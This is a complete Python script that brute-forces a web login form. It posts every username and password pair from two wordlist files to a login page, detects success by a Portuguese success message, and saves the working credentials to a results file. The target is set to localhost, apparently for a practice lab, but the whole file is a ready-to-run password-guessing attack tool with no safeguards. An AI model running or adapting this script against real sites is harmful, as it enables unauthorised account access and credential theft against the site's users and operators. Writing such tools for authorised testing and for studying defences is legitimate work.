import requests

def brute_force_web_form(url, users_file, passwords_file):
    with open(users_file, 'r') as u_file:
        users = [line.strip() for line in u_file]
    with open(passwords_file, 'r') as p_file:
        passwords = [line.strip() for line in p_file]

    found_credentials = []
    for user in users:
        for password in passwords:
            data = {'username': user, 'password': password, 'Login': 'Login'}
            try:
                response = requests.post(url, data=data)
                if 'Login bem-sucedido!' in response.text:
                    print(f"[SUCCESS] User: {user}, Password: {password}")
                    found_credentials.append((user, password))
                else:
                    print(f"[FAIL] User: {user}, Password: {password}")
            except requests.exceptions.ConnectionError:
                print(f"[ERROR] Connection refused for {url}")
                return []
    return found_credentials

if __name__ == '__main__':
    target_url = 'http://127.0.0.1/login.php'
    users_file = 'web_users.txt'
    passwords_file = 'web_passwords.txt'

    print(f"[*] Starting web form brute-force attack on {target_url}")
    credentials = brute_force_web_form(target_url, users_file, passwords_file)
    if credentials:
        with open('web_attack_results.txt', 'w') as f:
            for user, password in credentials:
                f.write(f"[SUCCESS] User: {user}, Password: {password}\n")
        print("[*] Web form attack completed. Results saved to web_attack_results.txt")
    else:
        print("[*] No credentials found or an error occurred.")
